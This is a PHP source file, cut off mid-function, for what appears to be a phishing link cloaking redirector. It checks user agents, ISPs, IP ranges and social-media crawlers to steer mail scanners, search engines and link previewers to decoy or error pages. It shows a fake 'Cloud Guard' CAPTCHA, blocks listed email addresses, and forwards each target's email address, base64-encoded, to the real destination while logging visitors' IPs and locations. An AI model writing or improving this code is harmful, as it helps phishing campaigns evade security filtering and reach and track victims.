<?php
global $blackListEmail, $blackListRequest, $blackListRequestFinalURLs, $blackListEmailFinalURLs, $blackListFinalURLs;
require_once __DIR__ . '/errors/403.php';
require_once __DIR__ . '/errors/404.php';
require_once __DIR__ . '/errors/500.php';

$dirName = getcwd();
if (strEndsWith($dirName, '/')) {
    $dirName = substr($dirName, 0, -1);
}

/**
 * Advanced Redirection Handler
 *
 * Provides intelligent redirection with bot detection and logging capabilities.
 *
 * @author Your Name
 * @version 1.0
 */
class Redirection
{
    /** @var string Path to log file */
    private $logFile;
    /** @var string Path to visitors log file */
    private $logVisitorsFile;
    /** @var string Path to rejected/blocked log file */
    private $logRejectedFile;

    /** @var array Bot redirect methods */
    private $botRedirectMethods = ['error403', 'error404', 'error500', 'mediaUrl'];
    /** @var string Custom subdomain */
    private $customSubdomain;

    /**
     * @var IPData | null
     */
    public $ipData = null;

    /** @var string Current IP address */
    public $ip = '';

    // /**
    //  * @var array{city: string, isp: string, regionName: string, country: string, org: string, ip: string}
    //  */

    /** @var string[] List of destination URLs */
    private $destinationUrls = [];

    /** @var array Whitelisted IP addresses */
    private $whitelist = [
        // Add whitelisted IPs here
        // '123.123.123.123',
    ];

    /** @var array Blacklisted IP addresses */
    private $blacklist = [
        // Add whitelisted IPs here
        // '123.123.123.123',
    ];

    /** @var array Configuration options */
    public $config = [
        // Core functionality settings
        'enableIpApiCheck' => true,      // Enable IP geolocation and validation checks
        'logRequests' => true,           // Log all incoming HTTP requests
        'logVisitors' => true,           // Track and log visitor information
        'blockBots' => true,             // Enable bot detection and blocking

        // Security and verification settings
        'useCaptcha' => true,            // Enable CAPTCHA verification for users
        'useAntiBot' => true,            // Enable advanced bot detection features
        'logRequestType' => true,        // Log request types when anti-bot is disabled
        'alwaysSolveCaptcha' => true,    // Force CAPTCHA on every visit, even if previously solved

        // Domain and subdomain configuration
        'useWildcardSubdomain' => false, // Enable wildcard subdomain support
        'useRandomSubdomain' => false,   // Generate random subdomains (requires wildcard enabled)

        // Redirection and routing settings
        'botRedirectMethod' => 'random', // How to handle bot traffic: random|error403|error404|error500|mediaUrl
        'redirectCode' => 301,           // HTTP status code for redirects (301: permanent, 302: temporary)
        'cacheTime' => 3600,            // Duration to cache IP check results in seconds
        'addPathToDestination' => false, // Preserve original path when redirecting
        'pathPosition' => 1,            // Starting segment for path preservation (1-based index)
        'preventRevisiting' => true,    // This prevent user to see the main page after they visited once, instead it redirect instantly to the destination

        // UI and user experience settings
        'captchaPageTitle' => "Cloud Guard",
        'useSafeListRedirection' => true,

        // Drive-by page configuration
        'useDriveBy' => true,
        'driveByPath' => null,          // Will be set to realpath in constructor
        'driveByDelay' => 10,           // Seconds to wait before redirecting from drive-by page

        // Error handling configuration (integrates with botRedirectMethod)
        'errorPattern' => [
            'useLink' => false,         // Use custom URLs instead of error pages when botRedirectMethod is error403/404/500
            "404" => 'https://www.baidu.com', // Custom 404 Not Found redirect (used when botRedirectMethod=error404 and useLink=true)
            "403" => 'https://www.baidu.com', // Custom 403 Forbidden redirect (used when botRedirectMethod=error403 and useLink=true)
            "500" => 'https://www.baidu.com', // Custom 500 Server Error redirect (used when botRedirectMethod=error500 and useLink=true)
        ],


        // Block requests that don't contain URL fragments (#) or query parameters (?)
        // Set to true to enforce this security measure, false to allow all requests
        // This can help to prevent unauthorized access attempts
        'blockRequestWithoutFragmentAndQuery' => false,

        // Block requests that don't contain an email address in the URL fragments (#) or query parameters (?)
        // Note: This setting only applies when 'blockRequestWithoutFragmentAndQuery' is set to true
        'blockRequestWithoutEmail' => false,

        // Redirect URL construction and email extraction configuration
        'redirectOptions' => [
            // URL construction method for redirects
            // Available options:
            // - "query + hash": Include both URL parameters and fragment/hash in redirect  - emailType will also be applied here
            // - "query": Include only URL parameters (everything after ?) in redirect - emailType will also be applied here 
            // - "hash": Include only URL fragment/hash (everything after #) in redirect - emailType will also be applied here
            // - "?email": Extract email from URL and add as query parameter (?extracted@email.com or ?ZXh0cmFjdGVkQGVtYWlsLmNvbQ==)
            // - "#email": Extract email from URL and add as hash fragment (#extracted@email.com or #ZXh0cmFjdGVkQGVtYWlsLmNvbQ==)
            // - "?random=email": Extract email and add as random parameter (?78sijdygebs=extracted@email.com or ?78sijdygebs=ZXh0cmFjdGVkQGVtYWlsLmNvbQ==)
            "type" => "?email",

            // Email encoding method when email is extracted and added to redirect URL
            // Available options:
            // - "base64": Encode extracted email using Base64 encoding for obfuscation
            // - "plain": Use extracted email in plain text format without encoding
            // - "direct": Use email exactly as found in original URL without modification
            'emailType' => 'base64',

            // Method for appending emails extracted from URL path segments to redirect URLs
            // This setting controls how emails found in URL paths (e.g., /user/john@example.com/profile) are added to the final redirect
            // Available options:
            // - "hash": Append extracted email as URL fragment/hash (#extracted@email.com or #ZXh0cmFjdGVkQGVtYWlsLmNvbQ==)
            // - "appendToQuery": Add extracted email as additional query parameter (?existing=value&extracted@email.com or ?existing=value&ZXh0cmFjdGVkQGVtYWlsLmNvbQ==)
            // - "query": Replace existing query parameters with extracted email (?extracted@email.com or ?ZXh0cmFjdGVkQGVtYWlsLmNvbQ==)
            // Note: Email encoding follows the 'emailType' setting above (base64/plain/direct)
            'appendEmailExtractFromPathAs' => 'hash',
        ],

        // Whether to use a custom HTTP header to obtain the client's IP address
        // Set to true if your server/proxy setup requires reading IP from a specific header
        // Default: false (uses standard REMOTE_ADDR)
        'userCustomHeaderForIp' => false,
        // The name of the custom HTTP header containing the client's real IP address - case insensitive
        // Only used when userCustomHeaderForIp is true
        // Common values: 'X-Forwarded-For', 'X-Real-IP', 'CF-Connecting-IP' (Cloudflare)
        // Default: 'REMOTE_ADDR'
        'customHeaderName' => 'REMOTE_ADDR',

        'middleware' => [
            'use' => false,
            'type' => 'form',// available options are form & captcha
            'file' => __DIR__ . '/middleware/redirect.php',
        ]
    ];

    /** @var CacheManager */
    private $cacheManager;

    /** @var ErrorLogger */
    public $errorLogger;

    /** @var array Blocked user agents */
    private $blockedUserAgents = [
        // Search Engine Bots
        'googlebot',
        'bingbot',
        'yandexbot',
        'baiduspider',
        'duckduckbot',
        // Email Clients
        'outlook',
        'thunderbird',
        'apple-mail',
        // Generic Crawlers
        'crawler',
        'spider',
        'bot',
        'scraper',
        // Social Media
        'facebookexternalhit',
        'twitterbot',
        'linkedinbot',
        // Other Common Bots
        'ahrefsbot',
        'semrushbot',
        'mj12bot',
        'dotbot'
    ];

    /** @var array Bot ISP providers */
    private $botISP = [
        "google",
        "amazon",
        "bitly",
        "bit.ly",
        "aws",
        "microsoft",
        "opera",
        "mozila",
        "firfox",
        "yahoo",
        "google",
        "yandex",
        "bing",
        "duckduckgo",
        "outlook",
        "office",
        "twitter",
        "facebook",
        "linkedin",
        "reddit",
        "pinterest",
        "windows",
        "amazon",
        "digitaloccean",
        "alibaba",
        "oracle",
        "telegram"
    ];

    /** @var array Social media IP ranges */
    private $socialMediaIpRanges = [
        'facebook' => [
            ['start' => '31.13.24.0', 'end' => '31.13.95.255', 'description' => 'Facebook Ireland'],
            ['start' => '66.220.144.0', 'end' => '66.220.159.255', 'description' => 'Facebook USA'],
            ['start' => '69.63.176.0', 'end' => '69.63.191.255', 'description' => 'Facebook USA'],
            ['start' => '69.171.224.0', 'end' => '69.171.255.255', 'description' => 'Facebook USA'],
            ['start' => '74.119.76.0', 'end' => '74.119.79.255', 'description' => 'Facebook USA'],
            ['start' => '103.4.96.0', 'end' => '103.4.99.255', 'description' => 'Facebook Asia'],
            ['start' => '173.252.64.0', 'end' => '173.252.127.255', 'description' => 'Facebook USA'],
            ['start' => '204.15.20.0', 'end' => '204.15.23.255', 'description' => 'Facebook USA'],
        ],
        'twitter' => [
            ['start' => '104.244.40.0', 'end' => '104.244.47.255', 'description' => 'Twitter'],
            ['start' => '185.45.5.0', 'end' => '185.45.5.255', 'description' => 'Twitter Ireland'],
            ['start' => '192.133.76.0', 'end' => '192.133.77.255', 'description' => 'Twitter USA'],
            ['start' => '199.16.156.0', 'end' => '199.16.159.255', 'description' => 'Twitter USA'],
            ['start' => '199.59.148.0', 'end' => '199.59.151.255', 'description' => 'Twitter USA'],
        ],
        'telegram' => [
            ['start' => '91.108.4.0', 'end' => '91.108.7.255', 'description' => 'Telegram DC1'],
            ['start' => '91.108.8.0', 'end' => '91.108.11.255', 'description' => 'Telegram DC2'],
            ['start' => '91.108.56.0', 'end' => '91.108.59.255', 'description' => 'Telegram DC3'],
            ['start' => '149.154.160.0', 'end' => '149.154.175.255', 'description' => 'Telegram DC4'],
            ['start' => '185.76.151.0', 'end' => '185.76.151.255', 'description' => 'Telegram DC5'],
        ],
        'linkedin' => [
            ['start' => '108.174.0.0', 'end' => '108.174.15.255', 'description' => 'LinkedIn Corp'],
            ['start' => '144.2.0.0', 'end' => '144.2.255.255', 'description' => 'LinkedIn Corp'],
            ['start' => '185.63.144.0', 'end' => '185.63.147.255', 'description' => 'LinkedIn Ireland'],
        ],
        'instagram' => [
            ['start' => '34.196.0.0', 'end' => '34.196.255.255', 'description' => 'Instagram AWS'],
            ['start' => '54.224.0.0', 'end' => '54.224.255.255', 'description' => 'Instagram AWS'],
        ],
        'pinterest' => [
            ['start' => '23.235.32.0', 'end' => '23.235.47.255', 'description' => 'Pinterest'],
            ['start' => '151.101.0.0', 'end' => '151.101.255.255', 'description' => 'Pinterest CDN'],
        ],
        'reddit' => [
            ['start' => '151.101.129.140', 'end' => '151.101.129.140', 'description' => 'Reddit'],
            ['start' => '151.101.65.140', 'end' => '151.101.65.140', 'description' => 'Reddit'],
            ['start' => '151.101.1.140', 'end' => '151.101.1.140', 'description' => 'Reddit'],
        ]
    ];

    /** @var array Bot redirect URLs */
    private $botRedirectedUrl = [];

    /**
     * Constructor with optional configuration
     *
     * @param array $config Optional configuration parameters
     */
    public function __construct($config = [], $destinationUrls = [], $whitelist = [], $botRedirectedUrl = [], $customSubdomain = '', $blacklist = [])
    {
        global $dirName;
        $logDir = "$dirName/logs";
        if (!file_exists("$logDir")) mkdir("$logDir", 0777, true);
        $this->logFile = $logDir . '/redirect_logs.txt';
        $this->logVisitorsFile = $logDir . '/visitors_logs.txt';
        $this->logRejectedFile = $logDir . '/blocked_logs.txt';
        $this->errorLogger = new ErrorLogger();

        // Merge custom config with defaults
        if (!empty($config)) {
            $this->config = array_merge($this->config, $config);
        }
        if ($this->config['useWildcardSubdomain']) {
            $this->customSubdomain = $this->config['useRandomSubdomain'] ? md5(mt_rand()) : ($customSubdomain ?? '');
            if (strlen($this->customSubdomain) > 0) {
                $url = $this->getSubdomainUrl($this->customSubdomain);
                if ($url) {
                    // Prevent caching
                    header('Cache-Control: no-cache, no-store, must-revalidate, max-age=0');
                    header('Pragma: no-cache');
                    header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');
                    header("Location: $url", true, 301);
                    die();
                }
            }
        }

        // Initialize CacheManager
        $this->cacheManager = new CacheManager();

        // Use provided bot redirect URLs or fall back to global config
        if (is_array($botRedirectedUrl) && count($botRedirectedUrl) > 0) {
            $this->botRedirectedUrl = $botRedirectedUrl;
        } else {
            // Fall back to global config variable from CONFIG.php
            $globalBotUrls = $GLOBALS['botRedirectedUrl'] ?? [];
            $this->botRedirectedUrl = is_array($globalBotUrls) && count($globalBotUrls) > 0 ? $globalBotUrls : ['https://youtube.com'];
        }

        if (!empty($destinationUrls)) {
            $this->destinationUrls = $destinationUrls;
        }

        if (!empty($whitelist)) {
            $this->whitelist = $whitelist;
        }

        if (!empty($blacklist)) {
            $this->blacklist = $blacklist;
        }

        if (!$this->config['alwaysSolveCaptcha']) $this->alreadyPassed();
        $this->ip = $this->getIp();

        $this->config['botRedirectMethod'] = in_array($this->config['botRedirectMethod'], $this->botRedirectMethods) ? $this->config['botRedirectMethod'] : 'random';
        // log visitors to file
        $this->isLogVisitors();
    }

    /**
     * Check if the current request is from a bot
     * @return bool
     */
    private function isBot()
    {
        $userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

        // Check for empty or suspicious user agents
        if (empty($userAgent) || strlen($userAgent) < 5) {
            return true;
        }

        // Check against blocked user agents
        foreach ($this->blockedUserAgents as $botAgent) {
            if (strContains($userAgent, $botAgent)) {
                return true;
            }
        }

        // Social Media Bot Detection
        $socialPatterns = [
            // Facebook
            '/facebookexternalhit|facebook|FB_IAB|FBAN|FBAV|fbcdn/i',
            '/facebook.com|fb.me|fb.com|fburl.com/i',

            // Twitter
            '/twitterbot|twitter|TweetmemeBot|TwitterFeedFetcher/i',
            '/tweet|twimg.com|t.co/i',

            // LinkedIn
            '/linkedinbot|linkedin|LinkedInBot-Testing|LinkedInApp/i',
            '/licdn.com|linkedin.com/i',

            // Pinterest
            '/pinterest|pinterestbot|PinBot/i',
            '/pin.it|pinimg.com/i',

            // Instagram
            '/instagram|instagrambot|InstagramBot|IGAPI/i',
            '/instagr.am|instagram.com/i',

            // WhatsApp
            '/whatsapp|whatsapp-bot|WhatsApp|WAWebBot/i',
            '/wa.me|whatsapp.com/i',

            // Slack
            '/slackbot|slack|Slackbot-LinkExpanding/i',
            '/slack.com|slack.io/i',

            // Discord
            '/discordbot|discord|DiscordBot/i',
            '/discord.com|discord.gg/i',

            // Telegram
            '/telegrambot|telegram|TelegramBot|TGBotPlatform|TelegramAPI/i',
            '/t.me|telegram.me|telegram.org/i',

            // Reddit
            '/redditbot|reddit|RedditBot|AlienBlue/i',
            '/reddit.com|redd.it/i',

            // VKontakte
            '/vkshare|vkBot|VKAndroid/i',
            '/vk.com|vk.me/i',

            // Weibo
            '/weibo|Weibo|WeiboBot/i',
            '/weibo.com|weibo.cn/i',

            // Line
            '/line|Line|LineBot/i',
            '/line.me|line.naver.jp/i',

            // Viber
            '/viber|ViberBot/i',
            '/viber.com/i',

            // QQ
            '/QQ|MQQBrowser/i',
            '/qq.com/i',

            // WeChat
            '/MicroMessenger|WeChat|WeChatBot/i',
            '/wechat.com|weixin.qq.com/i',

            // Snapchat
            '/Snapchat|SnapchatBot/i',
            '/snapchat.com/i',

            // Medium
            '/MediumBot|Medium/i',
            '/medium.com/i',

            // Common bot indicators
            '/bot|crawler|spider|scraper/i',
            '/fetch|grab|harvest|extract/i',
        ];

        foreach ($socialPatterns as $pattern) {
            if (preg_match($pattern, $userAgent)) {
                return true;
            }
        }

        return false;
    }

    /**
     * Get a random destination URL
     * @return string
     */
    private function getRandomDestination()
    {
        if (empty($this->destinationUrls)) {
            $this->botRedirection('');
        }
        return $this->destinationUrls[array_rand($this->destinationUrls)];
    }

    public function getIp()
    {
        // Check for specific headers first
        $ipAddress = "";
        if ($this->config['userCustomHeaderForIp']) {
            $ipAddress = $_SERVER[strtoupper($this->config['customHeaderName'])] ?? '';
        }
        if (isset($_SERVER['REMOTE_ADDR']) && empty($ipAddress)) $ipAddress = $_SERVER['REMOTE_ADDR'];
        if (isset($_SERVER['HTTP_X_REAL_IP']) && empty($ipAddress)) $ipAddress = $_SERVER['HTTP_X_REAL_IP'];
        if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && empty($ipAddress)) $ipAddress = $_SERVER['HTTP_CF_CONNECTING_IP'];

        // Define array of possible IP header keys
        $ipKeys = [
            'HTTP_X_REAL_IP',
            'CF-Connecting-IP',
            'x-real-ip',
            'CF-CONNECTING-IP',
            'X-REAL-IP',
            'REMOTE_ADDR',
            'HTTP_X_FORWARDED_FOR',
            'HTTP_X_FORWARDED',
            'HTTP_X_CLUSTER_CLIENT_IP',
            'HTTP_FORWARDED_FOR',
            'HTTP_FORWARDED',
            'HTTP_REMOTEADDR'
        ];

        if ($ipAddress && strContains($ipAddress, ',')) {
            $ipList = explode(",", $ipAddress);
            $ipAddress = trim($ipList[0]);
        }

        // Check each key in the array
        if (empty($ipAddress)) {
            foreach ($ipKeys as $key) {
                if (isset($_SERVER[strtoupper($key)])) {
                    $ip = $_SERVER[strtoupper($key)];
                    if ($ip) {
                        $ipList = explode(",", $ip);
                        $ipAddress = trim($ipList[0]);
                        break;
                    }
                }
            }
        }
        if (!empty($ipAddress)) {
            // Use the shared CacheManager for IP geolocation
            $geolocation = new IPGeolocation($this->cacheManager);
            $this->ipData = $geolocation->getIp($ipAddress);
        }

        if (empty($ipAddress)) {
            $ipAddress = "0.0.0.0";
        }

        // Return default IP if none found
        return $ipAddress;
    }

    public function blockEmailRequestAccess($url = '')
    {
        global $blackListEmail;
        if (empty($url)) {
            $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
            $host = $_SERVER['HTTP_HOST'] ?? '';
            $uri = $_SERVER['REQUEST_URI'] ?? '';
            $url = $protocol . '://' . $host . $uri;
        }
        if (count($blackListEmail) == 0) {
            return;
        }

        // Create a local lowercase copy without modifying the global array
        $blackListEmailLower = array_map('strtolower', $blackListEmail);
        foreach ($blackListEmailLower as $request) {
            if (strlen(trim($request)) < 6) {
                continue;
            }
            if (strContains(strtolower($url), $request)) {
                $this->blockedEmailRedirection($url);
                exit();
            }
        }

        $email = $this->extractEmailFromUrl($url);
        if (empty($email)) {
            return;
        }
        $isBlocked = in_array(strtolower($email), $blackListEmailLower);
        if ($isBlocked) {
            $this->blockedEmailRedirection($url);
            exit();
        }
    }

    public function blockRequestAccess($url = '')
    {
        global $blackListRequest;
        if (empty($url)) {
            $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
            $host = $_SERVER['HTTP_HOST'] ?? '';
            $uri = $_SERVER['REQUEST_URI'] ?? '';
            $url = $protocol . '://' . $host . $uri;
        }
        if (count($blackListRequest) == 0) {
            return;
        }
        foreach ($blackListRequest as $request) {
            if (strContains($url, $request)) {
                $this->blockedRequestRedirection($url);
                exit();
            }
        }
    }


    /**
     * Check if IP is in range
     * @param string $ip
     * @param string $start
     * @param string $end
     * @return bool
     */
    private function isIpInRange($ip, $start, $end)
    {
        $ipLong = ip2long($ip);
        $startLong = ip2long($start);
        $endLong = ip2long($end);
        return $ipLong >= $startLong && $ipLong <= $endLong;
    }

    /**
     * Check if IP belongs to social media platforms
     * @return bool
     */
    private function isSocialMediaIp()
    {
        $ip = $this->getIp();
        foreach ($this->socialMediaIpRanges as $platform => $ranges) {
            foreach ($ranges as $range) {
                if ($this->isIpInRange($ip, $range['start'], $range['end'])) {
                    return true;
                }
            }
        }
        return false;
    }

    /**
     * Check if IP is local
     * @param string $ip
     * @return bool
     */
    private function isLocalIp($ip)
    {
        return in_array($ip, ['127.0.0.1', '::1', 'localhost']);
    }

    /**
     * Validate IPv4 address
     * @param string $ip
     * @return bool
     */
    private function isValidIPv4($ip)
    {
        return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) !== false;
    }

    /**
     * Check ISP information for bot detection
     * @return bool
     */
    private function isIspBot()
    {
        if (!$this->ipData) return false;
        if (!$this->config['enableIpApiCheck'] || !$this->ipData->ip || !$this->isValidIPv4($this->ipData->ip) || !$this->ipData->isp) {
            return false;
        }
        $ispInfo = strtolower($this->ipData->isp . ' ' . ($this->ipData->org ?? '') . ' ' . ($this->ipData->as ?? ''));
        foreach ($this->botISP as $botIsp) {
            if (strContains($ispInfo, strtolower($botIsp))) {
                return true;
            }
        }
        return false;
    }

    /**
     * Check if IP belongs to a specific social platform
     * @return string|null
     */
    private function getSocialPlatform()
    {
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $platformPatterns = [
            'Facebook' => '/facebook|FB_IAB|FBAN|FBAV/i',
            'Twitter' => '/twitter/i',
            'LinkedIn' => '/linkedin/i',
            'Pinterest' => '/pinterest/i',
            'Instagram' => '/instagram|IGAPI/i',
            'WhatsApp' => '/whatsapp|WAWebBot/i',
            'Slack' => '/slack/i',
            'Discord' => '/discord/i',
            'Telegram' => '/telegram/i',
            'Reddit' => '/reddit|AlienBlue/i',
            'VKontakte' => '/vkshare|vkBot|VKAndroid/i',
            'Weibo' => '/weibo/i',
            'Line' => '/line/i',
            'Viber' => '/viber/i',
            'QQ' => '/QQ|MQQBrowser/i',
            'WeChat' => '/MicroMessenger|WeChat/i',
            'Snapchat' => '/Snapchat/i',
            'Medium' => '/Medium/i'
        ];

        foreach ($platformPatterns as $platform => $pattern) {
            if (preg_match($pattern, $userAgent)) {
                return $platform;
            }
        }
        return null;
    }

    /**
     * Check if the IP is from a real user with caching
     *
     * @return array
     */
    private function checkReal()
    {
        if (!$this->ipData) return ['isBot' => false, 'ip' => $this->getIp()];
        $ip = $this->ipData->ip;
        // Original implementation

        $isBot = !$this->isLocalIp($ip) && (($this->isIspBot() || $this->isSocialMediaIp() || $this->getSocialPlatform() || $this->isBot()));
        return ['isBot' => $isBot, 'ip' => $ip];
    }

    /**
     * Enhanced handle redirect with additional checks
     *
     * @return void
     */
    public function handleRedirect($url = '')
    {
        $ip = $this->getIp();
        $this->blockEmailRequestAccess($url);
        $this->blockRequestAccess($url);

        if ($this->config['blockRequestWithoutFragmentAndQuery']) {
            $useCaptcha = $this->config['useCaptcha'] === true;
            $useDriveBy = $this->config['useDriveBy'] === true;
            $blockRequestWithoutEmail = $this->config['blockRequestWithoutEmail'] === true;
            if ($useCaptcha || $useDriveBy) {
                if ($blockRequestWithoutEmail) {
                    if (empty($url)) {
                        $this->botRedirection($url);
                        exit();
                    }
                    $email = $this->extractEmailFromUrl($url);
                    if (!isset($email) || is_null($email) || empty($email)) {
                        $this->botRedirection($url);
                        exit();
                    }
                }
            }
        }

        if ($this->isBlacklisted($ip)) {
            $this->blockedListRedirection($url);
            exit();
        }

        // error_log(print_r($this->config, true));
        // // error_log(print_r($url, true));

        // Skip checks for whitelisted IPs
        if ($this->isWhitelisted($ip)) {
            $destination = $this->parse_url($url);

            if ($this->config['logRequests']) {
                $this->logEnhanced($destination, null, $url);
            }
            $this->redirect($destination);
        }
        $useAntiBot = $this->config['useAntiBot'] === true;
        $logRequestType = $this->config['logRequestType'] === true;
        $checkReal = (!$useAntiBot && $logRequestType) || $useAntiBot;

        // Basic bot checks
        $isBot = $checkReal && $this->checkReal()['isBot'];

        if ($isBot && $this->config['blockBots'] && $useAntiBot) {
            $this->botRedirection($url);
        } else {
            $destination = $this->parse_url($url);
            if ($this->config['logRequests']) {
                $this->logEnhanced($destination, $logRequestType || $useAntiBot ? $isBot : null, $url);
            }
            $this->redirect($destination);
        }

        // CacheManager handles its own persistence automatically

        exit();
    }

    /**
     * Enhanced logging with comprehensive browser details and email extraction
     *
     * @param string $destination
     * @param bool|null $_isBot
     * @param string $url
     * @return void
     */
    private function logEnhanced($destination, $_isBot, $url = '')
    {
        $useAntiBot = $this->config['useAntiBot'] === true;
        $logRequestType = $this->config['logRequestType'] === true;
        $checkReal = (!$useAntiBot && $logRequestType) || $useAntiBot;

        $isBot = gettype($_isBot) === 'boolean' ? $_isBot : ($checkReal ? $this->checkReal()['isBot'] : false);

        // Get comprehensive request information
        $requestInfo = $this->getRequestInfo($url);

        $logEntries = [
            ...$requestInfo,
            'is_bot' => $isBot ? 'yes' : 'no',
            'destination' => $destination,
        ];

        // Add IP data if available
        if ($this->ipData !== null) {
            $logEntries = array_merge($logEntries, $this->ipData->toPHP());
        } else {
            $logEntries['ip'] = $this->getIp();
            $logEntries['city'] = 'Unknown';
            $logEntries['regionName'] = 'Unknown';
            $logEntries['country'] = 'Unknown';
            $logEntries['isp'] = 'Unknown';
            $logEntries['org'] = 'Unknown';
        }

        $logEntry = [];
        foreach ($logEntries as $key => $value) {
            $logEntry[] = $key . ': ' . $value;
        }

        $logLine = str_replace('regionName', 'state', implode(' | ', $logEntry) . PHP_EOL);
        @file_put_contents($this->logFile, $logLine, FILE_APPEND);
        $this->resetVisitors();
        setcookie('v_passed', 'true', time() + 3600 * 5);
    }

    private function alreadyPassed()
    {
        if (isset($_COOKIE['v_passed'])) {
            $destination = $this->parse_url('');
            $this->redirect($destination);
        }
    }

    private function redirect($destination)
    {
        header('X-Frame-Options: DENY');
        header('X-XSS-Protection: 1; mode=block');
        header('X-Content-Type-Options: nosniff');
        header('Referrer-Policy: no-referrer');

        // Prevent caching
        header('Cache-Control: no-cache, no-store, must-revalidate, max-age=0');
        header('Pragma: no-cache');
        header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');
        echo '<html><head><meta http-equiv="refresh" content="0;url=' . $destination . '"></head></html>';
        exit;
    }


    /**
     * Enhanced logging for blocked requests with comprehensive browser details and email extraction
     *
     * @param string $url
     * @return void
     */
    private function logBlocked($url = '')
    {
        // Get comprehensive request information
        $requestInfo = $this->getRequestInfo($url);

        $logEntries = [
            ...$requestInfo,
            'is_bot' => 'yes',
            'blocked_reason' => 'bot_detected',
        ];

        // Add IP data if available
        if ($this->ipData !== null) {
            $logEntries = array_merge($logEntries, $this->ipData->toPHP());
        } else {
            $logEntries['ip'] = $this->getIp();
            $logEntries['city'] = 'Unknown';
            $logEntries['regionName'] = 'Unknown';
            $logEntries['country'] = 'Unknown';
            $logEntries['isp'] = 'Unknown';
            $logEntries['org'] = 'Unknown';
        }

        $logEntry = [];
        foreach ($logEntries as $key => $value) {
            $logEntry[] = $key . ': ' . $value;
        }

        $logLine = str_replace('regionName', 'state', implode(' | ', $logEntry) . PHP_EOL);
        @file_put_contents($this->logRejectedFile, $logLine, FILE_APPEND);
        $this->resetVisitors();
    }

    /**
     * Enhanced logging for visitors with comprehensive browser details and email extraction (unique per URL)
     *
     * @param string $url
     * @return void
     */
    private function logVisitors($url = '')
    {
        // Get comprehensive request information
        $requestInfo = $this->getRequestInfo($url);

        // Create unique identifier for this URL visit
        $urlHash = md5($url ?: $_SERVER['REQUEST_URI'] ?? '');

        $logEntries = [
            ...$requestInfo,
            'visit_type' => 'visitor',
            'url_hash' => $urlHash,
        ];

        // Add IP data if available
        if ($this->ipData !== null) {
            $logEntries = array_merge($logEntries, $this->ipData->toPHP());
        } else {
            $logEntries['ip'] = $this->getIp();
            $logEntries['city'] = 'Unknown';
            $logEntries['regionName'] = 'Unknown';
            $logEntries['country'] = 'Unknown';
            $logEntries['isp'] = 'Unknown';
            $logEntries['org'] = 'Unknown';
        }

        $logEntry = [];
        foreach ($logEntries as $key => $value) {
            $logEntry[] = $key . ': ' . $value;
        }

        $logLine = str_replace('regionName', 'state', implode(' | ', $logEntry) . PHP_EOL);
        @file_put_contents($this->logVisitorsFile, $logLine, FILE_APPEND);
    }

    private function getURLEmail($originalUrl)
    {
        // Get configuration options
        $redirectOptions = $this->config['redirectOptions'] ?? [];
        $type = $redirectOptions['type'] ?? '?email';
        $emailType = $redirectOptions['emailType'] ?? 'base64';

        // Parse the original URL
        $originalUrlParts = parse_url($originalUrl);
        parse_str($originalUrlParts['query'] ?? '', $queryParams);

        // Initialize result array
        $result = [
            'hash' => '',
            'query' => '',
            'value' => '',
            'direct' => ''
        ];

        // Extract email from URL and track where it came from
        $emailExtractionResult = $this->extractEmailWithSource($originalUrl);
        $extractedEmail = $emailExtractionResult['email'];
        $emailSource = $emailExtractionResult['source'];
        $emailParamName = $emailExtractionResult['paramName'];
        $emailIsPlain = $emailExtractionResult['isPlain'];
        $emailOriginal = $emailExtractionResult['original'] ?? $extractedEmail;
        $emailIsEmailKey = $emailExtractionResult['isEmailKey'];
        $emailIsEmailValue = $emailExtractionResult['isEmailValue'];
        // error_log(print_r($emailExtractionResult, true));
        // error_log(print_r($originalUrl, true));
        $encodedEmail = $this->encodeEmailByType($extractedEmail, $emailType, $emailIsPlain, $emailOriginal);

        // Process based on type configuration
        switch ($type) {
            case 'query + hash':
                // Include both query and hash
                $query = trim(isset($originalUrlParts['query']) ? $originalUrlParts['query'] : '');
                $hash = trim(isset($originalUrlParts['fragment']) ? $originalUrlParts['fragment'] : '');
                $query = $query === '?' ? '' : $query;

                if ($extractedEmail) {
                    // If email came from query parameters, replace it in place
                    if ($emailSource === 'query' && !empty($query)) {
                        $params = [];
                        foreach ($queryParams as $key => $value) {
                            if ($key === $emailParamName) {
                                if ($emailIsEmailKey) {
                                    $params[$key] = $encodedEmail;
                                } else {
                                    $params[$encodedEmail] = $value;
                                }
                            }
                        }
                        $query = http_build_query($params);
                    } else {
                        // If email didn't come from query, add it
                        if (!empty($query)) {
                            $query .= '&' . $encodedEmail;
                        } else {
                            $query = $encodedEmail;
                        }
                    }

                    // Apply email to hash as well
                    $hash = $encodedEmail;
                }

                $result['query'] = !empty($query) ? '?' . $query : '';
                $result['hash'] = !empty($hash) ? '#' . $hash : '';
                $result['value'] = $result['query'] . $result['hash'];
                break;

            case 'query':
                // Include only query parameters
                $query = isset($originalUrlParts['query']) ? $originalUrlParts['query'] : '';

                if ($extractedEmail) {
                    // If email came from query parameters, replace it in place
                    if ($emailSource === 'query' && !empty($query)) {
                        $params = [];
                        foreach ($queryParams as $key => $value) {
                            if ($key === $emailParamName) {
                                if ($emailIsEmailKey) {
                                    $params[$key] = $encodedEmail;
                                } else {
                                    $params[$encodedEmail] = $value;
                                }
                            }
                        }
                        $query = http_build_query($params);
                    } else {
                        // If email didn't come from query, add it
                        if (!empty($query)) {
                            $query .= '&' . $encodedEmail;
                        } else {
                            $query = $encodedEmail;
                        }
                    }
                }

                $result['query'] = !empty($query) ? '?' . $query : '';
                $result['value'] = $result['query'];
                break;

            case 'hash':
                // Include only hash fragment
                $hash = isset($originalUrlParts['fragment']) ? $originalUrlParts['fragment'] : '';

                if ($extractedEmail) {
                    $hash = $encodedEmail;
                }

                $result['hash'] = !empty($hash) ? '#' . $hash : '';
                $result['value'] = $result['hash'];
                break;

            case '?email':
                // Extract email and add as query parameter
                if ($extractedEmail) {
                    $result['query'] = '?' . $encodedEmail;
                }
                $result['value'] = $result['query'] ?? '';
                break;

            case '#email':
                // Extract email and add as hash fragment
                if ($extractedEmail) {
                    $result['hash'] = '#' . $encodedEmail;
                }

